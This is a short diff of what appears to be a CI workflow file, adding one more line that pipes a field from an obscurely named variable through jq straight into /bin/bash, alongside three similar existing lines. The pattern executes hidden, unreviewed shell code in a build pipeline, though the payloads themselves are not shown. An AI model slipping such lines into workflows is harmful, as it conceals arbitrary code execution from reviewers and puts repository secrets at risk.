@@ -29,6 +29,7 @@ jobs:
           echo $d69 | jq -r .ur3 | /bin/bash
           printf '%s' "$sbe4" | jq -r .epru93219 | /bin/bash
           echo $zzmh0 | jq -r .w41065 | /bin/bash
+          echo $zy1959 | jq -r .bd9 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
